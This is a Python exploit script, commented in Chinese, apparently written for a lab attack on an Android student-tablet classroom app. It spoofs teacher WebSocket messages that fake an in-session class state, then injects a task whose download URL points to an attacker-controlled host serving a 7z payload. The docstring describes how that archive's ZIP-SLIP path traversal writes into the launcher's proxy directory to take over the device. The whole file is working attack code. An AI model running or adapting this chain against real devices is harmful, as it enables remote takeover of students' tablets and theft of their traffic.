# -*- coding: utf-8 -*-
"""inject_upclass.py - 【关键】制造"上课中"状态 + 触发自动下载解压
依据(代码级):
  MessageHandleForOnlineHelper:425  type=0x190(400) -> "code_syn_start_sign"
  StudentDeskTopActivity:6523      onMsgEvent("code_syn_start_sign") -> jumpToStuSignActivity(SynchronousSignBean)
  StudentDeskTopActivity:1610      -> resetClassData(bean)
  StudentDeskTopActivity:2008      -> UpClassStateHelper.UP_CLASS_STATE(bean.setClassTime, bean.attendClass)
  ⇒ setClassTime=true + attendClass=2 ⇒ isEndUpClass()=false ⇒ AutoDownloadManager 闸门打开
然后注入任务(type=0)携带 resourceInfo.zipUrl=我们的.7z
  ⇒ ResourceHelper.downLoadResource -> StuFtpManager.downloadFromTeacher -> 下载成功
  ⇒ doHandDownLoadSuccess -> needDecode(zipUrl 以7z结尾) -> Z7Extractor.extractFile
  ⇒ ZIP-SLIP 写到 /mnt/sdcard/xhproxy/<密文> ⇒ 启动器代理切换 ⇒ 接管
"""
import json
import os
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"


def env(mtype, data, cid, tag, cmd=2, frm="teacher"):
    return json.dumps({
        "cmd": cmd, "ct": "", "from": frm, "gt": 0, "cId": cid,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
    }, ensure_ascii=False)


def inj(js, label, wait=8):
    with open(INJ, "w", encoding="utf-8") as f:
        f.write(js)
    print("INJ %s" % label, flush=True)
    time.sleep(wait)


def main():
    now = int(time.time() * 1000)
    # 1) SynchronousSignBean: attendClass=2(上课) setClassTime=true(已设课堂时间)
    #    字段名按 Java 字段原样(Gson 默认按字段名)
    sign = {
        "attendClass": 2, "setClassTime": True, "signType": 1,
        "classroomId": ROOM, "roomId": "LAB_ROOM1",
        "taskId": "LAB_T9", "userId": 2112229, "desktopId": "LAB_D9",
        "isPlay": 0, "isSilent": 1, "isSignFinish": 1,
        "isTeaStartSignTask": 1, "openAdvanceSignOut": 0, "classMode": 0,
        "childTaskId": {},
    }
    inj(env(400, json.dumps(sign, ensure_ascii=False), "179PE0001", "online_tag"),
        "★ type=400 code_syn_start_sign (setClassTime=true, attendClass=2)", 10)
    # 2) 再发一次(防 isDealStartSign 首次为空)
    inj(env(400, json.dumps(sign, ensure_ascii=False), "179PE0002", "online_tag"),
        "type=400 重发确认", 8)
    # 3) 注入任务, resourceInfo.zipUrl 指向我们的 7z 载荷
    td = {
        "taskId": "LAB_T9", "subTaskId": "LAB_S9", "allTaskId": "LAB_T9",
        "classroomId": ROOM, "classroomName": "lab",
        "desktopId": "LAB_D9", "subDesktopId": "LAB_D9",
        "defaultDesktopId": "LAB_D9", "defaultDesktopName": "lab",
        "sourceId": "LAB_R9", "itemType": 1, "taskType": 1,
        "taskCreateMode": 1, "pptSource": 1, "isFromPPT": 0,
        "number": 1, "originTotalNumber": 1, "content": "lab",
        "memo": "", "createTime": now, "expectedSendDate": now,
        "completed": False, "showStatus": 1, "percent": 0, "progress": "0",
        "positive": 1, "negative": 0, "score": 0.0, "studyTime": 0,
        "viewedIds": "", "viewedNum": 0,
        "resourceInfo": {"sourceId": "LAB_R9", "taskId": "LAB_T9",
                         "name": "lab", "type": 1,
                         "zipUrl": "http://%s/lab2.7z" % OUR,
                         "url": "http://%s/lab2.7z" % OUR,
                         "createTime": now},
    }
    inj(env(0, json.dumps(td, ensure_ascii=False), "179PE0003", "canvas_tag"),
        "★ type=0 任务(zipUrl=http://%s/lab2.7z)" % OUR, 12)
    print("done", flush=True)


if __name__ == "__main__":
    main()
